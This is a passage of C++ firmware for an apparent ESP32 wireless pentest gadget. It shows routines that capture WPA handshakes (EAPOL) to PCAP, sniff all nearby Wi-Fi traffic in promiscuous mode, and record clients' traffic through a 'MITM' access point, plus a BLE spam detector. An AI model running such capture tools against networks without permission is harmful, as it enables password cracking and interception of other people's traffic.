  waitAndReturnToMenu("Stopping Sniffing...");
}



// Sniff and deauth clients end




























void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}







// Maximum size of a Wi-Fi frame
#define MAX_FRAME_SIZE 2346
#define ESPNOW_MAX_DATA_LEN 250  // Maximum size of ESP-NOW data
const uint16_t MAX_FRAGMENT_SIZE = ESPNOW_MAX_DATA_LEN - sizeof(uint16_t) - sizeof(uint8_t) - sizeof(bool) - sizeof(uint8_t);

// Structure for frame fragments (must match exactly with the slave)
typedef struct {
  uint16_t frame_len;         // Length of the fragment
  uint8_t fragment_number;    // Fragment number
  bool last_fragment;         // Indicates if this is the last fragment
  uint8_t boardID;            // ID of the ESP32 sending the frame
  uint8_t frame[MAX_FRAGMENT_SIZE];  // Fragment of the frame
} wifi_frame_fragment_t;

uint8_t wifiFrameBuffer[14][MAX_FRAME_SIZE];  // Buffer to reconstruct frames for each ESP32
uint16_t received_len[14] = {0};              // Total length received for each ESP32
uint8_t expected_fragment_number[14] = {0};   // Expected fragment number for each ESP32
int received_frames[14] = {0};                // Frame count received for each ESP32
bool exitSniffMaster = false;                 // Variable to manage the exit

// Function to initialize a PCAP file with an incremented name
void initPCAP() {
  // Create the /handshakes folder if it does not exist
  if (!SD.exists("/handshakes")) {
    SD.mkdir("/handshakes");
  }

  // Find the next available file number
  int fileIndex = 0;
  String fileName;
  do {
    fileName = "/handshakes/masterSniffer_" + String(fileIndex, HEX) + ".pcap";
    fileIndex++;
  } while (SD.exists(fileName));

  // Open the file with the incremented name
  pcapFile = SD.open(fileName, FILE_WRITE);
  if (pcapFile) {
    const uint8_t pcapGlobalHeader[24] = {
      0xd4, 0xc3, 0xb2, 0xa1,  // Magic Number
      0x02, 0x00, 0x04, 0x00,  // Version 2.4
      0x00, 0x00, 0x00, 0x00,  // Timezone correction
      0x00, 0x00, 0x00, 0x00,  // Timestamp accuracy
      0xff, 0xff, 0x00, 0x00,  // SnapLen (maximum packet size)
      0x69, 0x00, 0x00, 0x00   // LinkType (Wi-Fi)
    };
    pcapFile.write(pcapGlobalHeader, sizeof(pcapGlobalHeader));
    pcapFile.flush();
    Serial.printf("PCAP file initialized: %s\n", fileName.c_str());
  } else {
    Serial.println("Unable to create the PCAP file");
  }
}

// Function to add a complete frame to the PCAP file
void saveToPCAP(const uint8_t *data, int data_len) {
  if (pcapFile) {
    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    uint32_t incl_len = data_len;
    uint32_t orig_len = data_len;

    pcapFile.write((uint8_t*)&ts_sec, sizeof(ts_sec));
    pcapFile.write((uint8_t*)&ts_usec, sizeof(ts_usec));
    pcapFile.write((uint8_t*)&incl_len, sizeof(incl_len));
    pcapFile.write((uint8_t*)&orig_len, sizeof(orig_len));
    pcapFile.write(data, data_len);
    pcapFile.flush();
    Serial.printf("Frame of %d bytes saved to the PCAP file\n", data_len);
  }
}

// Callback function to reassemble fragmented frames received via ESP-NOW
void OnDataRecvSniffer(const uint8_t *mac, const uint8_t *incomingData, int len) {
  wifi_frame_fragment_t *receivedFragment = (wifi_frame_fragment_t*)incomingData;

  // Verify the size of the received fragment
  if (len < sizeof(wifi_frame_fragment_t) - MAX_FRAGMENT_SIZE + receivedFragment->frame_len) {
    Serial.println("Incorrect fragment size, fragment ignored");
    return;
  }

  // Get the boardID of the ESP32 that sent the frame
  uint8_t boardID = receivedFragment->boardID;
  if (boardID < 1 || boardID > 14) {
    Serial.println("Invalid ESP32 ID");
    return;
  }

  // Verify the expected fragment number for this ESP32
  if (receivedFragment->fragment_number != expected_fragment_number[boardID - 1]) {
    Serial.println("Unexpected fragment number, resetting for this ESP32");
    received_len[boardID - 1] = 0;
    expected_fragment_number[boardID - 1] = 0;
    return;
  }

  // Copy the fragment into the buffer for this ESP32
  memcpy(wifiFrameBuffer[boardID - 1] + received_len[boardID - 1], receivedFragment->frame, receivedFragment->frame_len);
  received_len[boardID - 1] += receivedFragment->frame_len;
  expected_fragment_number[boardID - 1]++;

  // If it's the last fragment, process the complete frame
  if (receivedFragment->last_fragment) {
    Serial.printf("Complete frame received from ESP32 %d : %d bytes\n", boardID, received_len[boardID - 1]);
    saveToPCAP(wifiFrameBuffer[boardID - 1], received_len[boardID - 1]);
    received_frames[boardID - 1]++;
    displayStatus();  // Update display after receiving a frame
    // Reset counters for this ESP32
    received_len[boardID - 1] = 0;
    expected_fragment_number[boardID - 1] = 0;
  }
}

int lastTotalReceived = -1;  // Stocke l'ancien total des trames reçues
int lastReceivedFrames[14] = {0};  // Stocke les anciennes valeurs pour chaque boardID

void displayStatus() {
  // Calculer le total des trames reçues
  int totalReceived = 0;
  for (int i = 0; i < 14; i++) {
    totalReceived += received_frames[i];
  }

  // Mettre à jour uniquement si le total a changé
  if (totalReceived != lastTotalReceived) {
    tft.fillRect(0, 0, 320, 20, menuBackgroundColor);  // Effacer la ligne de l'ancien total
    tft.setTextSize(2);
    tft.setCursor(0, 0);  // Position du texte (en haut)
    tft.setTextColor(menuTextUnFocusedColor);
    tft.printf("Total Frames: %d", totalReceived);  // Afficher le nouveau total
    lastTotalReceived = totalReceived;  // Mettre à jour l'ancien total
  }

  // Préparer l'affichage des cases 2x7
  int cellWidth = 320 / 2;    // Largeur d'une case (2 colonnes)
  int cellHeight = (240 - 40) / 7;  // Hauteur d'une case (7 lignes), moins la ligne de 20px pour le total et une marge supplémentaire
  int marginY = 20;  // Marge en Y pour le haut (ligne du total)

  tft.setTextSize(2);  // Taille de texte des cases
  for (int i = 0; i < 14; i++) {
    if (received_frames[i] != lastReceivedFrames[i]) {  // Seulement si les trames reçues ont changé
      int col = i % 2;  // Colonne (0 ou 1)
      int row = i / 2;  // Ligne (0 à 6)

      // Calcul de la position X et Y
      int posX = col * cellWidth;
      int posY = marginY + row * cellHeight;

      // Effacer la case avant de redessiner
      tft.fillRect(posX, posY, cellWidth, cellHeight, menuBackgroundColor);  // Effacer la zone

      // Dessiner le rectangle de la case
      tft.drawRect(posX, posY, cellWidth, cellHeight, menuTextFocusedColor);

      // Créer le texte à afficher
      String text = String("CH ") + String(i + 1) + ": " + String(received_frames[i]);

      // Calculer la largeur du texte
      int textWidth = tft.textWidth(text);  // Largeur du texte complet

      // Calcul du centrage en X et Y
      int textX = posX + (cellWidth - textWidth) / 2;  // Centrage horizontal
      int textY = posY + (cellHeight - 16) / 2;  // Centrage vertical (16 est la hauteur de la police)

      // Afficher le texte centré dans la case
      tft.setCursor(textX, textY);
      tft.print(text);  // Afficher le texte

      // Mettre à jour la dernière valeur pour ce boardID
      lastReceivedFrames[i] = received_frames[i];
    }
  }
}


void sniffMaster() {
  Serial.println("Initializing SniffMaster mode...");
  screenDebounce();
  exitSniffMaster = false;  // Réinitialiser le drapeau de sortie
  tft.fillScreen(TFT_BLACK);

  // Réinitialiser les tableaux et variables
  memset(received_len, 0, sizeof(received_len));
  memset(expected_fragment_number, 0, sizeof(expected_fragment_number));
  memset(received_frames, 0, sizeof(received_frames));
  memset(wifiFrameBuffer, 0, sizeof(wifiFrameBuffer));

  // Initialiser la carte SD
  if (!SD.begin()) {
    Serial.println("SD card initialization failed");
    return;
  } else {
    Serial.println("SD card initialized successfully");
  }

  initPCAP();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW initialization failed");
    return;
  } else {
    Serial.println("ESP-NOW initialized successfully");
  }

  if (esp_now_register_recv_cb(OnDataRecvSniffer) != ESP_OK) {
    Serial.println("Error registering the ESP-NOW callback");
    return;
  } else {
    Serial.println("ESP-NOW callback registered successfully");
  }

  displayStatus();  // Afficher le statut initial

  while (!exitSniffMaster) {
    handleDnsRequestSerial();  // Tâches en arrière-plan

    // Gérer l'arrêt avec les contrôles tactiles
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (x >= 0 && y >= 0) {  // Arrêter si une touche est détectée
        stopSniffMaster();
        break;
      }
    }
  }
}

void stopSniffMaster() {
  esp_now_unregister_recv_cb();  // Stop receiving ESP-NOW data
  esp_now_deinit();  // Deinitialize ESP-NOW
  if (pcapFile) {
    pcapFile.close();
  }
  exitSniffMaster = true;  // Signal the exit to the main mode
  waitAndReturnToMenu("Returning to menu...");
}


void wifiVisualizer() {
  bool inVisualizer = true;

  const int screenWidth = 320;
  const int screenHeight = 240;
  const int maxChannels = 13;
  const int leftMargin = 30;
  const int rightMargin = 10;
  const int chartWidth = screenWidth - leftMargin - rightMargin;
  const int spacing = 4;

  const int barWidth = (chartWidth - (spacing * (maxChannels - 1))) / maxChannels;
  const int chartHeight = screenHeight - 50;  // Leave space for bottom text and margins

  screenDebounce();

  tft.fillScreen(menuBackgroundColor);
  tft.setTextSize(2);
  tft.setTextFont(1);
  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  tft.setCursor(screenWidth / 2 - 60, screenHeight / 2 - 10);
  tft.printf("Scanning...");

  static int colors[] = {TFT_WHITE, TFT_RED, TFT_PINK, TFT_ORANGE, TFT_YELLOW, TFT_GREENYELLOW, TFT_GREEN, TFT_DARKGREEN, TFT_CYAN, TFT_BLUE, TFT_NAVY, TFT_PURPLE, TFT_MAROON, TFT_MAGENTA};

  // Draw scale on the left side
  for (int i = 0; i <= 5; i++) {
    int yPosition = chartHeight - (i * chartHeight / 5) + 15;
    tft.drawLine(leftMargin - 8, yPosition, leftMargin, yPosition, menuSelectedBackgroundColor);
    tft.setCursor(2, yPosition - 10);
    int scaleValue = (5 * i);
    tft.printf("%d", scaleValue);
  }

  // Draw channel numbers at the bottom
  for (int i = 1; i <= maxChannels; i++) {
    int xPosition = leftMargin + (i - 1) * (barWidth + spacing);
    tft.setCursor(xPosition + (barWidth / 2) - 6, screenHeight - 20);
    tft.setTextColor(colors[i + 1], menuBackgroundColor);
    tft.printf("%d", i);
  }

  WiFi.mode(WIFI_STA);
  WiFi.scanNetworks(true);
  bool scanInProgress = true;

  while (true) {
    int n = WiFi.scanComplete();
    if (n >= 0) {
      scanInProgress = false;

      int channels[maxChannels + 1] = {0};

      if (n == 0) {
        Serial.println("Aucun réseau WiFi trouvé.");
      } else {
        for (int i = 0; i < n; i++) {
          int channel = WiFi.channel(i);
          if (channel >= 1 && channel <= maxChannels) {
            channels[channel]++;
          }
        }
      }

      WiFi.scanDelete();

      int maxCount = 1;
      for (int i = 1; i <= maxChannels; i++) {
        if (channels[i] > maxCount) {
          maxCount = channels[i];
        }
      }

      int scaleMax = ((maxCount + 4) / 5) * 5;
      if (scaleMax < 5) scaleMax = 5;

      tft.fillScreen(menuBackgroundColor);
      tft.setTextSize(2);
      tft.setTextFont(1);

      tft.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      for (int i = 0; i <= 5; i++) {
        int yPosition = chartHeight - (i * chartHeight / 5) + 15;
        tft.drawLine(leftMargin - 8, yPosition, screenWidth - 10, yPosition, menuSelectedBackgroundColor);
        tft.setCursor(2, yPosition - 10);
        int scaleValue = (scaleMax * i) / 5;
        tft.printf("%d", scaleValue);
      }

      for (int i = 1; i <= maxChannels; i++) {
        int barHeight = map(channels[i], 0, scaleMax, 0, chartHeight);
        int xPosition = leftMargin + (i - 1) * (barWidth + spacing);

        int amount = 100;
        uint8_t r = (colors[i] >> 11) & 0x1F;
        uint8_t g = (colors[i] >> 5) & 0x3F;
        uint8_t b = colors[i] & 0x1F;

        uint8_t red = (r * 255) / 31;
        uint8_t green = (g * 255) / 63;
        uint8_t blue = (b * 255) / 31;

        red = (red > amount) ? (red - amount) : 0;
        green = (green > amount) ? (green - amount) : 0;
        blue = (blue > amount) ? (blue - amount) : 0;

        r = (red * 31) / 255;
        g = (green * 63) / 255;
        b = (blue * 31) / 255;

        uint16_t shadowColor = (r << 11) | (g << 5) | b;
        uint16_t barColor = colors[i];

        tft.fillRect(xPosition, screenHeight - barHeight - 30, barWidth, barHeight, barColor);

        tft.fillTriangle(
          xPosition + barWidth, screenHeight - barHeight - 30,
          xPosition + barWidth + 4, screenHeight - barHeight - 34,
          xPosition + barWidth + 4, screenHeight - 30, shadowColor
        );

        tft.drawRect(xPosition, screenHeight - barHeight - 30, barWidth, barHeight, colors[i]);

        tft.setCursor(xPosition + (barWidth / 2) - 6, screenHeight - 20);
        tft.setTextColor(colors[i], menuBackgroundColor);
        tft.printf("%d", i);
      }

      WiFi.scanNetworks(true);
      scanInProgress = true;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      break;
    }

    delay(100);
  }

  inMenu = true;
  drawMenu();
}




typedef struct snifferAll_pcap_hdr_s {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} snifferAll_pcap_hdr_t;

typedef struct snifferAll_pcaprec_hdr_s {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} snifferAll_pcaprec_hdr_t;

int allSniffCount = 0;
int beaconCount = 0;
int eapolCount = 0;
int probeReqCount = 0;
int probeRespCount = 0;
int deauthCountSniff = 0;
int packetSavedCount = 0;

bool isPaused = false;
bool cursorVisible = true;

File sniffFile;

void writePCAPHeader_snifferAll(File & file) {
  Serial.println("Writing PCAP header to the file...");
  snifferAll_pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105;

  file.write((const uint8_t*)&pcap_header, sizeof(snifferAll_pcap_hdr_t));
  file.flush();
  Serial.println("PCAP header written.");
}

void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println("Capture file not open or sniffing is paused, packet not recorded.");
    return;
  }
  uint16_t sig_len = packet->rx_ctrl.sig_len;

  const uint8_t *frame = packet->payload;
  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;
  if (frameSubType == 0x08 || frameSubType == 0x04 || frameSubType == 0x05 || frameSubType == 0x0D || frameSubType == 0x0B || frameSubType == 0x0C) {
    sig_len -= 4;
  }

  Serial.println("Recording a packet to the PCAP file...");
  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();

  if (estUnPaquetEAPOL(packet)) {
    eapolCount++;
    Serial.printf("EAPOL packet recorded. Number of EAPOL: %d\n", eapolCount);
  } else {
    switch (frameSubType) {
      case 0x08:
        beaconCount++;
        Serial.printf("Beacon packet recorded. Number of Beacons: %d\n", beaconCount);
        break;
      case 0x04:
        probeReqCount++;
        Serial.printf("Probe Request packet recorded. Number of Probe Requests: %d\n", probeReqCount);
        break;
      case 0x05:
        probeRespCount++;
        Serial.printf("Probe Response packet recorded. Number of Probe Responses: %d\n", probeRespCount);
        break;
      case 0x0C:
        deauthCountSniff++;
        Serial.printf("Deauthentication packet recorded. Number of Deauthentications: %d\n", deauthCountSniff);
        break;
      default:
        Serial.println("Unrecognized packet type recorded.");
        break;
    }
  }

  packetSavedCount++;
  Serial.printf("Packet recorded. Total number of packets saved: %d\n", packetSavedCount);
}

void allTrafficCallback_snifferAll(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_snifferAll(pkt);
}

void findNextAvailableFileID() {
  Serial.println("Searching for the next available file ID...");
  allSniffCount = 0;
  File root = SD.open("/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("RawSniff_")) {
        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}


void allTrafficSniffer() {
  // Réinitialisation des compteurs
  beaconCount = 0;
  eapolCount = 0;
  probeReqCount = 0;
  probeRespCount = 0;
  deauthCountSniff = 0;
  packetSavedCount = 0;

  Serial.println("Resetting packet counters...");
  screenDebounce();

  // Vérification de l'existence du dossier sur la carte SD
  if (!SD.exists("/sniffer") && !SD.mkdir("/sniffer")) {
    Serial.println("Unable to create /sniffer directory");
    return;
  }
  findNextAvailableFileID();

  // Création du nom de fichier pour la capture
  char filename[50];
  sprintf(filename, "/sniffer/RawSniff_%02X.pcap", allSniffCount);

  // Ouverture du fichier pour l'écriture
  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println("Failed to open capture file for writing");
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  // Configuration du mode Wi-Fi en mode promiscuous
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(allTrafficCallback_snifferAll);

  Serial.println("Starting all traffic sniffer...");
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(menuTextFocusedColor);
  tft.setCursor(3, 0);
  tft.println("Sniffing Raw on :");
  tft.println(filename);

  bool exitSniff = false;
  unsigned long lastCursorBlinkTime = 0;

  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    handleDnsRequestSerial();
    unsigned long currentTime = millis();

    // Affichage des statistiques
    tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    tft.setCursor(0, 40);
    tft.printf("     < [Channel]: %d > \n", currentChannel);
    tft.setCursor(0, 60);
    tft.printf("[Beacon]      : %d\n", beaconCount);
    tft.printf("[EAPOL]       : %d\n", eapolCount);
    tft.printf("[Deauth]      : %d\n", deauthCountSniff);
    tft.printf("[ProbeReq]    : %d\n", probeReqCount);
    tft.printf("[ProbeResp]   : %d\n", probeRespCount);
    tft.printf("[Total]       : %d\n", packetSavedCount);
    tft.setCursor(0, tft.height() - 20);

    // Clignotement du curseur toutes les secondes
    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
    tft.printf(cursorVisible ? ">_" : "> ");

    // Indicateur de pause
    if (isPaused) {
      tft.fillRect(tft.height() - 60, tft.height() - 40 , tft.width(), 20, TFT_RED);
      tft.setCursor(tft.width() / 2 - 20, tft.height() - 40);
      tft.setTextColor(TFT_WHITE, TFT_RED);
      tft.print(" PAUSE ");
    } else {
      tft.fillRect(tft.height() - 60, tft.height() - 40 , tft.width(), 20, menuBackgroundColor);
    }

    // Détection tactile pour changer de canal, pause, et sortie
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        // Zone de gauche - Canal précédent
        currentChannel = (currentChannel > 1) ? currentChannel - 1 : 14;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        Serial.printf("Channel decreased, now on: %d\n", currentChannel);
        screenDebounce();
      } else if (x > 2 * (tft.width() / 3)) {
        // Zone de droite - Canal suivant
        currentChannel = (currentChannel < 14) ? currentChannel + 1 : 1;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        Serial.printf("Channel increased, now on: %d\n", currentChannel);
        screenDebounce();
      } else {
        // Zone du milieu - Divisée en deux : Pause en haut et retour en bas
        if (y < tft.height() / 2) {
          // Haut de la zone centrale - Pause/Resume
          isPaused = !isPaused;
          Serial.printf("Sniffer %s by touch.\n", isPaused ? "paused" : "resumed");
        } else {
          // Bas de la zone centrale - Quitter
          exitSniff = true;
          Serial.println("Exit detected by touch, stopping sniffer...");
        }
      }
    }

  }


  // Désactivation du mode promiscuous
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  // Fermeture du fichier
  sniffFile.close();
  Serial.println("Stopped all traffic sniffer, file closed.");
  waitAndReturnToMenu("Stopping Sniffing...");
}





void recordPacketToPCAPFile_MITM(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println("Capture file not open or sniffing is paused, packet not recorded.");
    return;
  }

  uint16_t sig_len = packet->rx_ctrl.sig_len;
  const uint8_t *frame = packet->payload;

  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameType = (frameControl & 0x0C) >> 2;
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  bool toDS = frameControl & (1 << 8);
  bool fromDS = frameControl & (1 << 9);

  if (frameType != 0x02) {
    return;
  }

  if (frameSubType == 0x4 || frameSubType == 0xC) {
    size_t header_length = 24;
    if (frameSubType & 0x08) {
      header_length += 2;
    }
    if (frameControl & 0x8000) {
      header_length += 4;
    }
    size_t total_header_length = header_length + 4;

    if (sig_len <= total_header_length) {
      return;
    }
  }

  uint8_t da[6];
  if (toDS && fromDS) {
    memcpy(da, frame + 24, 6);
  } else if (toDS && !fromDS) {
    memcpy(da, frame + 16, 6);
  } else {
    memcpy(da, frame + 4, 6);
  }

  bool isIPv4Multicast = (da[0] == 0x01) && (da[1] == 0x00) && (da[2] == 0x5e) && ((da[3] & 0x80) == 0x00);
  bool isIPv6Multicast = (da[0] == 0x33) && (da[1] == 0x33);

  if (isIPv4Multicast || isIPv6Multicast) {
    return;
  }

  Serial.println("Recording a packet to the PCAP file...");

  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();

  packetSavedCount++;
}

void findNextAvailableFileIDClient() {
  Serial.println("Searching for the next available file ID...");
  allSniffCount = 0;
  File root = SD.open("/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("ClientSniff_")) {
        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}
void TrafficMITMCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_MITM(pkt);
}

void sniffNetwork() {
  if (getConnectedPeopleCount() == 0) {
    waitAndReturnToMenu("No client connected..");
    return;
  }
  Serial.println("Resetting packet counters...");
  packetSavedCount = 0;
  screenDebounce();

  if (!SD.exists("/sniffer") && !SD.mkdir("/sniffer")) {
    Serial.println("Unable to create /sniffer directory");
    return;
  }
  findNextAvailableFileIDClient();

  char filename[50];
  sprintf(filename, "/sniffer/ClientSniff_%02X.pcap", allSniffCount);

  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println("Failed to open capture file for writing");
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(TrafficMITMCallback);

  Serial.println("Starting all traffic sniffer...");
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(menuTextFocusedColor);
  tft.setCursor(3, 0);
  tft.println("Sniffing Raw on :");
  tft.println(filename);

  bool exitSniff = false;
  unsigned long lastCursorBlinkTime = 0;

  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    handleDnsRequestSerial();

    if (getConnectedPeopleCount() == 0) {
      Serial.println("No stations connected, stopping sniffer and returning to menu...");
      tft.fillScreen(TFT_BLACK);
      tft.setTextColor(TFT_RED);
      int centerX = 320 / 2 - (10 * strlen("No clients connected")) / 2;
      int centerY = 240 / 2 - 8;
      tft.setCursor(centerX, centerY);
      tft.println("No more clients...");
      vTaskDelay(pdMS_TO_TICKS(2000));
      exitSniff = true;
      continue;
    }

    unsigned long currentTime = millis();

    // Affichage des statistiques
    tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    tft.setCursor(0, 60);
    tft.printf("[Total]       : %d\n", packetSavedCount);
    tft.setCursor(0, tft.height() - 16);

    // Clignotement du curseur toutes les secondes
    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
    tft.printf(cursorVisible ? ">_" : "> ");

    // Détection tactile pour quitter
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() / 2) {
        // Bas de l'écran - Quitter
        exitSniff = true;
        Serial.println("Exit detected by touch, stopping sniffer...");
      }
    }
  }

  // Désactivation du mode promiscuous
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  // Fermeture du fichier
  sniffFile.close();
  Serial.println("Stopped all traffic sniffer, file closed.");
  waitAndReturnToMenu("Stopping Sniffing...");
}


// Check handshake
std::vector<String> pcapFiles;
int currentListIndexPcap = 0;

void checkHandshakes() {
  loadPcapFiles();
  displayPcapList();
  screenDebounce();

  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
  const unsigned long debounceDelay = 250;  // Delai de debounce en millisecondes

  int x = 0, y = 0; // Initialisation des variables x et y

  while (true) {
    // Mise à jour et détection tactile
    esp_task_wdt_reset();
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      x = map(touch.xRaw, minX, maxX, 0, tft.width()); // Définir x ici
      y = map(touch.yRaw, minY, maxY, 0, tft.height()); // Définir y ici

      if (y > tft.height() - 20) {
        // Zone de bas - retour au menu
        waitAndReturnToMenu("Return to menu");
        return;
      } else if (x < tft.width() / 3) {
        // Zone de gauche - fichier précédent
        navigatePcapList(false);
        lastKeyPressTime = millis();
      } else if (x > 2 * (tft.width() / 3)) {
        // Zone de droite - fichier suivant
        navigatePcapList(true);
        lastKeyPressTime = millis();
      }
    }

    unsigned long currentPressTime = millis();
    if (currentPressTime - lastKeyPressTime > debounceDelay) {
      screenDebounce();
    }
  }
}



void loadPcapFiles() {
  File root = SD.open("/handshakes");
  pcapFiles.clear();
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.endsWith(".pcap")) {
        pcapFiles.push_back(filename);
      }
    }
  }
  if (!pcapFiles.empty()) {
    currentListIndexPcap = 0;  // Réinitialisez l'indice si de nouveaux fichiers sont chargés
  }
}

void displayPcapList() {
  const int listDisplayLimit = tft.height() / 18;
  int listStartIndex = max(0, min(currentListIndexPcap, int(pcapFiles.size()) - listDisplayLimit));

  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  for (int i = listStartIndex; i < min(int(pcapFiles.size()), listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndexPcap) {
      tft.fillRect(0, (i - listStartIndex) * 18, tft.width(), 18, menuSelectedBackgroundColor);
      tft.setTextColor(menuTextFocusedColor);
    } else {
      tft.setTextColor(menuTextUnFocusedColor);
    }
    tft.setCursor(10, (i - listStartIndex) * 18);
    tft.println(pcapFiles[i]);
  }
}

void navigatePcapList(bool next) {
  if (next) {
    currentListIndexPcap++;
    if (currentListIndexPcap >= pcapFiles.size()) {
      currentListIndexPcap = 0;
    }
  } else {
    currentListIndexPcap--;
    if (currentListIndexPcap < 0) {
      currentListIndexPcap = pcapFiles.size() - 1;
    }
  }
  displayPcapList();
}
// Check handshake end



// Wof part // from a really cool idea of Kiyomi // https://github.com/K3YOMI/Wall-of-Flippers
unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
static bool isBLEInitialized = false;

struct ForbiddenPacket {
  const char* pattern;
  const char* type;
};

std::vector<ForbiddenPacket> forbiddenPackets = {
  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"},
  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"},
  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"},
  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"},
  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"},
  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},
  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},
  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},
  {"ff006db643ce97fe427c___________", "LOVE_TOYS"}
};

bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
  size_t patternLength = strlen(pattern);
  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
    char byteString[3] = {pattern[i], pattern[i + 1], 0};
    if (byteString[0] == '_' && byteString[1] == '_') continue;

